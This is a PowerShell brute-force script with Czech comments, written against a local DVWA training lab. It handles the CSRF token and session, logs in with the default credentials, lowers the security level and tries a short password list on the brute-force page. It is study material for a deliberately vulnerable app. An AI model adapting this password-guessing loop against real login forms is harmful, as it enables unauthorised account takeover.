# dvwa-bruteforce.ps1
# Brute-force skript proti DVWA (PowerShell 7+, s CSRF tokenem)

$baseUrl     = "http://localhost/dvwa"
$loginUrl    = "$baseUrl/login.php"
$securityUrl = "$baseUrl/security.php"
$bruteUrl    = "$baseUrl/vulnerabilities/brute/"

$dvwaUser = "admin"
$dvwaPass = "password"

$targetUser = "admin"

$passwordList = @(
    "admin"
    "password"
    "123456"
)

Write-Host "[*] Krok 1: Načítám login stránku a CSRF token..." -ForegroundColor Cyan

# 1) GET login page – získáme session + user_token
$loginGet = Invoke-WebRequest -Uri $loginUrl -SessionVariable session

$tokenRegex = 'name\s*=\s*["'']user_token["'']\s+value\s*=\s*["'']([^"'']+)["'']'
$tokenMatch = [regex]::Match($loginGet.Content, $tokenRegex)

if (-not $tokenMatch.Success) {
    Write-Host "[!] Nepodařilo se najít user_token na login stránce!" -ForegroundColor Red
    throw "Missing CSRF token"
}

$userToken = $tokenMatch.Groups[1].Value
Write-Host "    DEBUG user_token: $userToken" -ForegroundColor DarkGray

# 2) POST login s user_token
Write-Host "[*] Krok 2: Přihlašuji se jako $dvwaUser ..." -ForegroundColor Cyan

$loginBody = @{
    username   = $dvwaUser
    password   = $dvwaPass
    Login      = "Login"
    user_token = $userToken
}

$loginResponse = Invoke-WebRequest -Uri $loginUrl -Method Post -Body $loginBody -WebSession $session

# Úspěch = už nejsme na login stránce (title začíná "Login :: ...")
if ($loginResponse.Content -like "*Login :: Damn Vulnerable Web Application*") {
    Write-Host "[!] Login se pravděpodobně NEZDAŘIL (stále jsme na login stránce)." -ForegroundColor Red
    $snippet = $loginResponse.Content.Substring(0, [Math]::Min(400, $loginResponse.Content.Length))
    Write-Host "    DEBUG: Výřez odpovědi po loginu:" -ForegroundColor DarkGray
    Write-Host $snippet
    throw "Login failed"
}

Write-Host "[+] Přihlášení do DVWA proběhlo úspěšně." -ForegroundColor Green

$cookies   = $session.Cookies.GetCookies($baseUrl)
$phpsessid = $cookies | Where-Object { $_.Name -eq "PHPSESSID" }
Write-Host "[+] PHPSESSID: $($phpsessid.Value)" -ForegroundColor Green

    function Set-SecurityLevel {
        param(
            [string]$Level = 'low',
            [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
            [string]$BaseUrl
        )

        Write-Host "[*] Nastavuji security level na '$Level'..." -ForegroundColor Yellow
        try {
            # Načteme stránku security.php pro získání CSRF tokenu
            $secPage = Invoke-WebRequest -Uri "$BaseUrl/security.php" -WebSession $Session -UseBasicParsing
            $tokenPattern = @'
<input[^>]*name\s*=\s*["']user_token["'][^>]*value\s*=\s*["']([^"']+)["']
'@
            $tokenMatch = [regex]::Match($secPage.Content, $tokenPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase -bor [System.Text.RegularExpressions.RegexOptions]::Singleline)
            if (-not $tokenMatch.Success) {
                Write-Warning "[!] Nelze najít CSRF token na security.php; zkusím token z loginu pokud je k dispozici."
            }
            $token = if ($tokenMatch.Success) { $tokenMatch.Groups[1].Value } else { $null }

            $body = @{
                security = $Level
                seclev_submit = 'Submit'
            }
            if ($token) { $body.user_token = $token }

            $resp = Invoke-WebRequest -Uri "$BaseUrl/security.php" -Method Post -Body $body -WebSession $Session -UseBasicParsing

            # Ověření: zkusíme najít cookie 'security'
            $secCookie = $null
            foreach ($c in $Session.Cookies) { if ($c.Name -eq 'security') { $secCookie = $c; break } }
            if ($secCookie -and $secCookie.Value -ieq $Level) {
                Write-Host "[+] Security level nastaven na '$Level' (cookie)." -ForegroundColor Green
                return $true
            }

            # fallback: zkontrolujeme obsah odpovědi, zda obsahuje indikátor úrovně
            $plain = $resp.Content -replace '<[^>]+>', ' '
            if ($plain -match "(?i)$Level") {
                Write-Host "[+] Security level nastaven na '$Level' (response)." -ForegroundColor Green
                return $true
            }

            Write-Warning "[!] Nepodařilo se ověřit nastavení security na '$Level'. Odezva serveru může být odlišná."
            return $false
        } catch {
            Write-Host "[!] Chyba při nastavování security: $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }

    # Pokusíme se nastavit security přes formulář (spolehlivější než jen přidat cookie)
    if (-not (Set-SecurityLevel -Level 'low' -Session $session -BaseUrl $baseUrl)) {
        Write-Warning "[!] Nastavení security se nezdařilo. Skript bude pokračovat, ale chování DVWA může být jiné." 
    }

# 3) Nastavení security level na LOW
Write-Host "[*] Krok 3: Nastavuji security=low ..." -ForegroundColor Cyan

$securityBody = @{
    security      = "low"
    seclev_submit = "Submit"
}

Invoke-WebRequest -Uri $securityUrl -Method Post -Body $securityBody -WebSession $session | Out-Null

$cookies        = $session.Cookies.GetCookies($baseUrl)
$securityCookie = $cookies | Where-Object { $_.Name -eq "security" }
Write-Host "[+] security cookie: $($securityCookie.Name) = $($securityCookie.Value)" -ForegroundColor Green

# 4) Brute force útok
Write-Host "[*] Krok 4: Začínám bruteforce proti $bruteUrl pro uživatele '$targetUser'" -ForegroundColor Cyan

$found = $false

foreach ($pwd in $passwordList) {

    Write-Host "[-] Zkouším heslo: $pwd"

    # Escapneme parametry
    $uUser = [uri]::EscapeDataString($targetUser)
    $uPass = [uri]::EscapeDataString($pwd)

    # ★ TADY BYL PROBLÉM – teď to složíme korektně:
    $uri = "{0}?username={1}&password={2}&Login=Login" -f $bruteUrl, $uUser, $uPass

    Write-Host "    DEBUG URL: $uri" -ForegroundColor DarkGray

    $resp = Invoke-WebRequest -Uri $uri -Method Get -WebSession $session

    $len = [Math]::Min(200, $resp.Content.Length)
    $snippet = $resp.Content.Substring(0, $len)
    Write-Host "    DEBUG Response snippet:" -ForegroundColor DarkGray
    Write-Host $snippet

    # Úspěšná hláška – podle tebe:
    # "Welcome to the password protected area admin"
    if ($resp.Content -like "*Welcome to the password protected area admin*") {
        Write-Host "[+] Nalezeno správné heslo: $pwd" -ForegroundColor Green
        $found = $true
        break
    } else {
        Write-Host "    DEBUG: Úspěšný text se nenašel." -ForegroundColor DarkGray
    }
}

if (-not $found) {
    Write-Host "[!] V seznamu se nepodařilo najít správné heslo." -ForegroundColor Red
}